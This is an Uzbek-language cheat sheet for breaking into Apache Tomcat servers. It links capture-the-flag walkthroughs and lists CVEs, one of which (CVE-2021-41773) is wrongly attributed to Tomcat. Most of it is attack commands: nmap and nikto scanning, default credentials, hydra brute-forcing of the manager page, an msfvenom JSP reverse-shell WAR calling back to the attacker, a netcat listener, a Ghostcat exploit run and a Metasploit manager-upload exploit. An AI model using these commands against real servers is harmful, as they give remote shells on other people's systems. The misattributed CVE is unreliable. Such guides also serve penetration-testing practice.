1. **Version - Apache Tomcat/ Coyote JSP Engine 1.1**   
https://www.hackingarticles.in/hack-the-box-jerry-walkthrough/

2. **Version - Apache Tomcat 9.0.30**     
https://medium.com/@Z3pH7/tryhackme-tomghost-write-up-thm-3ba961fa0f44   

3. **My Tomcat Host:1**   
https://medium.com/@z6157881/my-tomcat-host-1-walkthrough-vulnhub-d267b36db003   

4. https://www.hackingarticles.in/tabby-hackthebox-walkthrough/   

5. https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00   

Apache Tomcatda eng ko‘p uchraydigan zaifliklar:  

|     CVE        |	              Tavsif	              |  Ta’sir qilingan versiyalar  |
|----------------|--------------------------------------|------------------------------|
|CVE-2020-1938   |	Ghostcat – Fayl o‘qish va bajarish  |	Tomcat 6-9 (8009 port)       |
|CVE-2017-12615  | 	Remote Code Execution (RCE)	        | Tomcat 7.0.79                |
|CVE-2019-0232   |	Windows RCE	                        | Tomcat 9.0.17                |
|CVE-2021-41773  |	Path Traversal	                    | Tomcat 9.0.30-9.0.50         |    

Tomcat odatda 8080, 8009, yoki 80 portlarida ishlaydi. nmap yordamida portlarni skanerlash:    
```
nmap -sV -sC -p 8080,8009,80 <target_ip>
```   
Brauzerda `http://<target_ip>:8080` sahifasini oching.     
1. Admin-GUI (Eskirgan) `http://<target_ip>:8080/admin`  
2. Manager-GUI `http://<target_ip>:8080/manager/html`, `http://<target_ip>:8080/host-manager/html`

Nikto skaneri bilan avtomatik tekshirish:  
```
nikto -h http://[TARGET_IP]:8080
```    

**Standart login ma'lumotlari**   
|   Username	 |   Password  |
|--------------|-------------|
|    tomcat	   |    tomcat   |
|    admin	   |    admin    |
|   manager	   |   manager   |
|     root	   |     root    |     

Hydra yordamida bruteforce qilish:   
```
hydra -L users.txt -P passwords.txt [TARGET_IP] http-get /manager/html
```

**1. Serverga shell joylashtirish (Remote Code Execution - RCE)**   
 - msfvenom yordamida Tomcat uchun WAR shell yarating:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f war > shell.war
```
 - Netcat yordamida teskari ulanishni kutish:
```
nc -lvnp 4444
```
 - WAR faylni Tomcatga yuklash. http://[TARGET_IP]:8080/manager/html deploy bo‘limida shell.war faylni yuklang. Shellni ishga tushirish uchun quyidagi URL'ni oching: http://[TARGET_IP]:8080/shell/
      
**2. Ghostcat (CVE-2020-1938) ekspluatatsiyasi**   
Agar 8009 porti ochiq bo‘lsa, bu AJP protokoli bo'lib, Tomcat zaifligini ekspluatatsiya qilish mumkin.  
 - Ghostcat ekspluatini yuklash va ishlatish.
```
git clone https://github.com/YDHCUI/CVE-2020-1938
cd CVE-2020-1938
```   
```
python3 ajpShooter.py [TARGET_IP] 8009
```
```
python3 ajpShooter.py -u / --upload shell.war
```   

**3. Metasploit orqali Tomcat buzib kirish (Tomcat manager hujumi)**   
```
msfconsole
```

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS [TARGET_IP]
set LHOST [YOUR_IP]
set LPORT 4444
set HttpUsername tomcat
set HttpPassword tomcat
exploit
```
